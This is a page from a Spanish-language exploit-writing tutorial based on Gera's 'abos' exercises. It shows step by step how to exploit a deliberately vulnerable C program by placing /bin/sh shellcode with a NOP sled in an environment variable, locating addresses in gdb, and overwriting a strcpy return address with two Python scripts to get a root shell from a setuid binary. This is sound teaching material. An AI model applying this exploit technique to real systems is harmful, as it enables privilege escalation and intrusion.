<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">GNU GPL</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-usando-variables-de-entorno">Ataque usando variables de entorno</h1>

<h2 id="análisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="abo-6">Abo 6</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* abo6.c                                                   *
 * specially crafted to feed your brain by gera@core-sdi.com */</span>

<span class="cm">/* return to me my love                                     */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">pbuf</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">pbuf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="qué-hace-el-programa">¿Qué hace el programa?</h3>
<p>Este programa es muy similar al Abo 5, apila dos variables locales: el puntero <code class="highlighter-rouge">pbuf</code> (que apunta al heap) y <code class="highlighter-rouge">buf</code>. Después de copiar el contenido del primer y segundo parámetro en las variables entra en un loop infinito con <code class="highlighter-rouge">while(1)</code>, provocando que <code class="highlighter-rouge">main()</code> nunca retorne.</p>

<h3 id="layout-de-la-pila-antes-del-exploit">Layout de la pila antes del exploit:</h3>
<p>En este punto de la ejecución el mapa de la pila es el siguiente:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
       <span class="kt">char</span> <span class="o">*</span><span class="n">pbuf</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
       <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
     
<span class="n">eip</span> <span class="o">=&gt;</span> <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
       <span class="n">strcpy</span><span class="p">(</span><span class="n">pbuf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
       <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>
<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo6/layout-pila.png" alt="layout pila" /></p>

<h3 id="cuál-es-la-dificultad-principal">¿Cuál es la dificultad principal?</h3>
<p>Al igual que en el abo5 de nada nos serviría sobreescribir la dirección de retorno de <code class="highlighter-rouge">main()</code>, ya que por el loop infinito <code class="highlighter-rouge">while(1)</code> nunca retorna.</p>

<h2 id="ataque-smash-the-stack-con-variables-de-entorno">Ataque “Smash the stack” con variables de entorno</h2>
<p>Hasta este punto almacenabamos el shellcode en una variable local dentro de la pila. Si bien hay estrategias para reducir la cantidad de bytes de un shellcode (optimizando el código assembler al máximo), es esperable que este búfer sea demasiado pequeño para almacenarlo. Una solución alternativa es almacenar el shellcode en otros espacios de memoria como las variables de entorno, que no tienen restricciones de tamaño y -a su vez- también se almacenan en la pila.</p>

<p>Aquí un detalle del almacenamiento de las variables de entorno en la pila:</p>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/variables-entorno.png" alt="variables-entorno" /></p>

<p>Para probar el funcionamiento de este ataque creamos una nueva variable de entorno <code class="highlighter-rouge">VAR</code> con el string “prueba”:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> <span class="nb">export </span><span class="nv">VAR</span><span class="o">=</span>prueba
<span class="gp">user@abos:~$</span> <span class="nb">env</span>               <span class="p">;</span> consultamos las variables de entorno
<span class="go">XDG_SESSION_ID=XXX
TERM=xterm-256color
SHELL=/bin/bash
</span><span class="gp">VAR=prueba                     ;</span> nueva variable de entorno
<span class="c">....
</span></code></pre></div></div>
<p>Ahora creamos una variable de entorno <code class="highlighter-rouge">SHELLCODE</code> dónde vamos a almacenar el shellcode:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> <span class="k">for </span>i <span class="k">in</span> <span class="k">$(</span>python <span class="nt">-c</span> <span class="s1">'print("\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43")'</span><span class="k">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-en</span> <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span> <span class="o">&gt;</span> shellcode.bin
<span class="gp">user@abos:~$</span> <span class="nb">export </span><span class="nv">SHELLCODE</span><span class="o">=</span><span class="k">$(</span><span class="nb">cat </span>shellcode.bin<span class="k">)</span>
<span class="gp">user@abos:~$</span> <span class="nb">env</span>
<span class="go">XDG_SESSION_ID=XXX
</span><span class="gp">SHELLCODE=�1�[�C��C                                  ;</span> el shellcode
<span class="go">                    ��S
                       1Ұ
                         �1�̀�����/bin/shABBBBCCCC
TERM=xterm-256color
SHELL=/bin/bash
</span><span class="c">....
</span></code></pre></div></div>

<p>En este punto cuando ejecutemos el programa vulnerable sabremos que el shellcode inyectado al que debemos redireccionar la ejecución está en la pila junto al resto de las variables de entorno.</p>

<p>El objetivo será modificar la dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code> para que apunte a la variable de entorno <code class="highlighter-rouge">shellcode</code> en vez de retornar a <code class="highlighter-rouge">main()</code>. Al igual que antes, lo logramos de manera indirecta:</p>
<ol>
  <li><code class="highlighter-rouge">strcpy(buf,argc[1])</code> con el primer parámetro sobreescribirmos <code class="highlighter-rouge">pbuf</code> para que apunte a la dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code>.</li>
  <li><code class="highlighter-rouge">strcpy(pbuf,argc[2])</code> dado que el segundo parámetro modifica el valor al que apunta <code class="highlighter-rouge">pbuf</code>, con él podemos sobreescribir la dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code> para que apunte a la variable de entorno <code class="highlighter-rouge">SHELLCODE</code>.</li>
</ol>

<h3 id="layout-de-la-pila-deseado">Layout de la pila deseado:</h3>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo6/layout-pila-shell.png" alt="layout pila" /></p>

<ol>
  <li>Inyectamos el shellcode en una nueva variable de entorno
    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> gcc <span class="nt">-m32</span> <span class="nt">-fno-stack-protector</span> <span class="nt">-ggdb</span> <span class="nt">-mpreferred-stack-boundary</span><span class="o">=</span>2 <span class="nt">-z</span> execstack <span class="nt">-o</span> abo6 abo6.c
<span class="gp">user@abos:~$</span> <span class="nb">sudo chown </span>root ./abo6<span class="p">;</span> <span class="nb">sudo chmod </span>u+s ./abo6                      <span class="p">;</span> root owner y setuid
<span class="go">
</span><span class="gp">user@abos:~$</span> <span class="k">for </span>i <span class="k">in</span> <span class="k">$(</span>python <span class="nt">-c</span> <span class="s1">'print("\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43")'</span><span class="k">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-en</span> <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span> <span class="o">&gt;</span> shellcode.bin
<span class="go">
</span><span class="gp">user@abos:~$</span> <span class="nb">export </span><span class="nv">SHELLCODE</span><span class="o">=</span><span class="k">$(</span><span class="nb">cat </span>shellcode.bin<span class="k">)</span>
<span class="gp">user@abos:~$</span> <span class="nb">env</span>
<span class="go">XDG_SESSION_ID=XXX
SHELLCODE=�1�[�C��C
                 ��S
                    1Ұ
                      �1�̀�����/bin/shABBBBCCCC
TERM=xterm-256color
SHELL=/bin/bash
</span></code></pre></div>    </div>
    <blockquote>
      <p><strong>Consideraciones</strong>: en esta instancia se apela a un truco para lograr una <a href="/guia-escritura-exploits/buffer-overflow/2-practica.html#lograr-privilegios-de-root">shell con privilegios de root</a> se modifican los permisos del binario con <code class="highlighter-rouge">chown</code> y <code class="highlighter-rouge">chmod</code>.</p>
    </blockquote>
  </li>
  <li>Averiguamos la dirección del shellcode en la pila.   <br />
Para lograr consistencia en las direcciones de la pila con y sin <code class="highlighter-rouge">gdb</code>corremos el programa con el script <a href="/guia-escritura-exploits/configuracion.md#script-fixenv">fixenv de Hellman</a>.
    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">   user@abos:~$</span> ./r.sh gdb ./abo6
<span class="go">   (gdb) show env
   XDG_SESSION_ID=328
</span><span class="gp">   SHELLCODE=�1�[�C��C                       ;</span> shellcode en <span class="nb">env</span>
<span class="go">             �1�̀�����/bin/shABBBBCCCC
   SHELL=/bin/bash
   
</span><span class="gp">   (gdb) x/2000s $</span>esp                           <span class="p">;</span> vemos addr de shellcode
<span class="go">   0xbffff90a:	"XDG_SESSION_ID=335"
</span><span class="gp">=&gt;</span> 0xbffff91d:	<span class="s2">"SHELLCODE="</span>, <span class="s1">'\220'</span> &lt;repeats 20 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"</span><span class="se">\0</span><span class="s2">61</span><span class="se">\3</span><span class="s2">00</span><span class="se">\0</span><span class="s2">61</span><span class="se">\3</span><span class="s2">33</span><span class="se">\0</span><span class="s2">61</span><span class="se">\3</span><span class="s2">11</span><span class="se">\2</span><span class="s2">31</span><span class="se">\2</span><span class="s2">60</span><span class="se">\2</span><span class="s2">44</span><span class="se">\3</span><span class="s2">15</span><span class="se">\2</span><span class="s2">00j</span><span class="se">\v</span><span class="s2">XQh//shh/bin</span><span class="se">\2</span><span class="s2">11</span><span class="se">\3</span><span class="s2">43Q</span><span class="se">\2</span><span class="s2">11</span><span class="se">\3</span><span class="s2">42S</span><span class="se">\2</span><span class="s2">11</span><span class="se">\3</span><span class="s2">41</span><span class="se">\3</span><span class="s2">15</span><span class="se">\2</span><span class="s2">00"</span>
<span class="go">   0xbffff95f:	"SHELL=/bin/bash"
</span><span class="c">   ....
</span><span class="go">
</span><span class="gp">   (gdb) x/4wx 0xbffff91d                      ;</span> ASCII de <span class="s2">"SHELLCODE"</span> + nops
<span class="go">   0xbffff91d:	0x4c454853	0x444f434c	0x90903d45	0x90909090

</span><span class="gp">   (gdb) x/xw 0xbffff91d+10                    ;</span> addr nop slide
<span class="gp">=&gt;</span> 0xbffff927:	0x90909090
</code></pre></div>    </div>
    <p>Primero detectamos que en <code class="highlighter-rouge">0xbffff91d</code> comienza el nombre de la variable de entorno, es decir el string “SHELLCODE”. A esa dirección le sumamos diez caracteres para saltearnos el string del nombre y obtener una dirección que desemboque directamente en los NOPs (en <code class="highlighter-rouge">gdb</code> verificamos que en <code class="highlighter-rouge">0xbffff927</code> están los nops). Entonces la dirección a la que debemos redirigir el flujo de ejecución es: <code class="highlighter-rouge">0xbffff927</code>.</p>
  </li>
  <li>
    <p>Armamos ambos argumentos a usar.   <br />
<img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo6/exploit.png" alt="input" /></p>

    <ol>
      <li>
        <p>Primer argumento: usamos el primer <code class="highlighter-rouge">strcpy(buf,argc[1])</code> para sobreescribir <code class="highlighter-rouge">pbuf</code> con un overflow y lo hacemos apuntar, ya no al heap, sino a la dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code>, que como aún no sabemos cuál es indicamos <code class="highlighter-rouge">0x41414141</code>.</p>

        <p>Con esto armamos un archivo python para ingresar como primer parámetro:</p>
        <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">param1</span><span class="o">.</span><span class="n">py</span>
      
<span class="c">#! /usr/bin/env python</span>
      
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
      
<span class="n">len_buf</span> <span class="o">=</span> <span class="mi">256</span>
<span class="n">ret_addr_strcpy</span> <span class="o">=</span> <span class="mh">0x41414141</span>                <span class="c">#???? </span>
      
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span> <span class="o">*</span> <span class="n">len_buf</span>                 <span class="c">#fill buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_strcpy</span><span class="p">)</span>      <span class="c">#set pbuf</span>
      
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>        </div>
      </li>
      <li>
        <p>Segundo argumento: aprovechando <code class="highlighter-rouge">strcpy(pbuf,argc[2])</code> modificamos el valor al que apunta <code class="highlighter-rouge">pbuf</code>, es decir, modificamos la dirección de retorno del <code class="highlighter-rouge">strcpy()</code> y la reemplazamos por la dirección del shellcode del entorno. 
Armamos un archivo python para ingresar como segundo parámetro:</p>
        <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">param2</span><span class="o">.</span><span class="n">py</span> 
      
<span class="c">#! /usr/bin/env python</span>
      
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
      
<span class="n">env_shell_addr</span> <span class="o">=</span> <span class="mh">0xbffff927</span>
      
<span class="n">exploit</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">env_shell_addr</span><span class="p">)</span>         <span class="c">#set ret addr del 2do strcpy()</span>
      
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>        </div>
      </li>
    </ol>
  </li>
  <li>
    <p>Finalmente, averiguamos la dirección de retorno que va a apilar el segundo <code class="highlighter-rouge">strcpy()</code>, ejecutando el programa vulnerable con los dos argumentos definidos antes.</p>

    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> ./r.sh gdb ./abo6
<span class="go">
</span><span class="gp">(gdb) break 13                                        ;</span> <span class="nb">break </span>en 2do strcpy<span class="o">()</span>
<span class="gp">(gdb) r "$</span><span class="o">(</span>./param1.py<span class="o">)</span><span class="s2">" "</span><span class="k">$(</span>./param2.py<span class="k">)</span><span class="s2">"
</span><span class="go">(gdb) c
Continuing.

Breakpoint 2, main (argv=3, argc=0xbffff6d4) at abo6.c:13
</span><span class="gp">13    strcpy(pbuf,argc[2]);</span>
<span class="go">
</span><span class="gp">(gdb) x/2i $</span>eip                 
<span class="gp">=&gt;</span> 0x80484a5 &lt;main+74&gt;: push   DWORD PTR <span class="o">[</span>ebp-0x4]
<span class="gp">   0x80484a8 &lt;main+77&gt;</span>: call   0x8048310 &lt;strcpy@plt&gt;
<span class="go">(gdb) si
</span><span class="gp">(gdb) x/i $</span>eip                                        <span class="p">;</span> llegamos al call de 2do strcpy<span class="o">()</span>
<span class="gp">=&gt;</span> 0x80484a8 &lt;main+77&gt;: call   0x8048310 &lt;strcpy@plt&gt;
<span class="gp">(gdb) si                                              ;</span> entramos en 2do strcpy<span class="o">()</span>
<span class="go">0x08048310 in strcpy@plt ()
</span><span class="gp">(gdb) x/wx $</span>esp                                       <span class="p">;</span> vemos ret_addr apilada 
<span class="go">0xbffff528: 0x080484ad
(gdb) 
</span></code></pre></div>    </div>
    <p>Llegamos al punto en el que se ejecuta la línea de código <code class="highlighter-rouge">strcpy(pbuf,argc[2])</code>, avanzamos una siguiente instrucción con <code class="highlighter-rouge">si</code> y leemos el tope de la pila <code class="highlighter-rouge">x/wx $esp</code> para conocer en qué dirección se apiló la dirección de retorno a <code class="highlighter-rouge">main()</code>. La dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code> que debemos sobreescribir es entonces <code class="highlighter-rouge">0xbffff528</code>.</p>

    <blockquote>
      <p><strong>Consideraciones</strong>: el programa vulnerable toma dos argumentos que se almacenan en la pila y por ende su longitud afecta los cálculos de las direcciones. Es por eso que para saber con exactitud la dirección de retorno debemos cuidar que las distintas ejecuciones del programa tengan argumentos siempre de igual longitud. Incluso planificamos que los valores temporales que usamos como <code class="highlighter-rouge">0x41414141</code> ocupen el mismo espacio que ocupará la dirección definitiva.</p>
    </blockquote>

    <p>Actualizamos con la dirección de retorno con el valor correcto en el primer parámetro del exploit.</p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">param1</span><span class="o">.</span><span class="n">py</span>
   
<span class="c">#! /usr/bin/env python</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="n">len_buf</span> <span class="o">=</span> <span class="mi">256</span>
<span class="n">ret_addr_strcpy</span> <span class="o">=</span> <span class="mh">0xbffff528</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span> <span class="o">*</span> <span class="n">len_buf</span>                 <span class="c">#fill buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_strcpy</span><span class="p">)</span>      <span class="c">#set pbuf</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>Lo ejecutamos y logramos la shell.
    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> ./r.sh ./abo6 <span class="s2">"</span><span class="k">$(</span>./param1.py<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>./param2.py<span class="k">)</span><span class="s2">"</span>
<span class="gp">#</span> <span class="nb">id</span>
<span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=1001(user),27(sudo)
</span><span class="gp">#</span> <span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">#</span> 
</code></pre></div>    </div>
    <p>Suponiendo que el binario vulnerable fue creado por root con permisos especiales setuid, con este ataque lograríamos una root shell que podrá por ejemplo acceder a archivos como root, etc.</p>
  </li>
</ol>

<h2 id="material-consultado">Material consultado</h2>
<p>[1]. Erickson, Jon. (2008). Hacking: the art of exploitation.</p>


</div>

    </div>

  </body>
</html>
